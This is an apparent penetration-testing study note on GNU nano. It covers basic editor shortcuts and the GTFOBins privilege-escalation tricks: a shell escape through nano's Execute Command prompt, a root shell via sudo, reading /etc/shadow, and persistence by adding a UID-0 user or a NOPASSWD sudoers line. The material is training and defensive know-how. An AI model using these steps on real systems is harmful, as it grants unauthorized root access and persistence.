# nano

**Tags:** `#nano` `#editor` `#gtfobins` `#privesc` `#restrictedshellescape` `#sudo` `#suid`

GNU nano — the beginner-friendly **modeless** editor you reach for when vim's modality is in the way (type directly, shortcuts shown along the bottom). Security relevance is the same **[GTFOBins](https://gtfobins.github.io/gtfobins/nano/)** story as [[Tools/Command Shell/Vim|vim]]: with `sudo`/SUID it reads and writes any file, and its **Read File → Execute Command** feature spawns a shell — so `sudo nano` is a one-step root pop.

**Source:** https://www.nano-editor.org · **GTFOBins:** https://gtfobins.github.io/gtfobins/nano/
**Install:** preinstalled on most distros (`apt install nano` if not)

```bash
# The pop: inside nano, Ctrl-R then Ctrl-X ("Execute Command"), then:
reset; sh 1>&0 2>&0
```

---

## Survival usage

Modeless — just start typing. Shortcuts use `^` = Ctrl and `M-` = Alt/Meta.

| Goal | Keys |
|---|---|
| Save (Write Out) | `^O` then `Enter` |
| Exit | `^X` |
| Cut / paste line | `^K` / `^U` |
| Search | `^W` |
| Go to line | `^_` (or `M-G`) |
| Read a file into buffer | `^R` |
| Show all shortcuts | `^G` |

---

## Privilege Escalation & Shell Escape (GTFOBins)

### Shell via "Execute Command"

nano can run an external command through its **Read File** prompt, and that's enough to spawn an interactive shell:

```
nano
^R          # Ctrl-R  → "File to insert" prompt
^X          # Ctrl-X  → toggles that prompt to "Command to execute"
reset; sh 1>&0 2>&0
```

`reset; sh 1>&0 2>&0` gives an interactive shell wired to nano's stdin/stdout. This is the same feature whether nano is run normally, via sudo, or SUID.

### sudo → root shell

Exactly the box you popped:

```bash
sudo nano
# then:  ^R ^X   →   reset; sh 1>&0 2>&0     →  root shell
```

> [!warning] **A file-restricted sudo rule is still full root.** `(root) NOPASSWD: /bin/nano /var/log/app.log` looks scoped, but `^R` reads *any* file and `^R^X` runs *any* command — nano ignores the argument restriction. Any sudo-able editor = root.

### SUID nano → read/write root files

An exec'd shell may drop the elevated euid, so for SUID nano use its **file** primitives (which run with root euid) instead of the shell trick:

```bash
./nano /etc/shadow            # read root-only file
./nano /etc/passwd            # then add a UID-0 user and ^O to save
```

### File read / write with privilege → persistence

```bash
sudo nano /etc/shadow         # read hashes
sudo nano /etc/passwd         # add a root user
sudo nano /etc/sudoers        # add a NOPASSWD line
```

**Privileged-file payloads** (same for any write primitive — full set in [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]]):

```bash
# UID-0 user for /etc/passwd
openssl passwd -1 -salt x Password123        # -> $1$x$....
# add line:  hacker:$1$x$....:0:0:root:/root:/bin/bash

# NOPASSWD line for /etc/sudoers
<user> ALL=(ALL) NOPASSWD: ALL
```

> [!note] **Restricted nano** (`rnano`, or `nano -R`/`--restricted`) disables Read File and Execute Command — the shell trick is blocked, and you can only edit the file it was opened with. The file-edit privesc (if that file is `/etc/passwd`-class) may still work; the shell escape won't.

---

## Quick Reference

| Goal | Command / Keys |
|---|---|
| Shell escape (in nano) | `^R` `^X` → `reset; sh 1>&0 2>&0` |
| sudo → root | `sudo nano` → `^R^X` → `reset; sh 1>&0 2>&0` |
| SUID → read root file | `./nano /etc/shadow` |
| SUID/sudo → persistence | edit `/etc/passwd` (UID-0 user) or `/etc/sudoers` (NOPASSWD) |
| Save / exit | `^O` `Enter` / `^X` |
| Restricted build | `rnano` / `nano -R` blocks the shell trick |

---

> [!note] **See also**
> Sibling editor, same GTFO story (with modal survival tips): [[Tools/Command Shell/Vim|Vim / vi]].
> Sudo/SUID enumeration + the file-write payloads: [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]] (Sudo Exploitation / SUID).
> Full per-context catalog: [GTFOBins — nano](https://gtfobins.github.io/gtfobins/nano/).

---

*Created: 2026-08-13*
*Updated: 2026-08-13*
*Model: claude-opus-5*
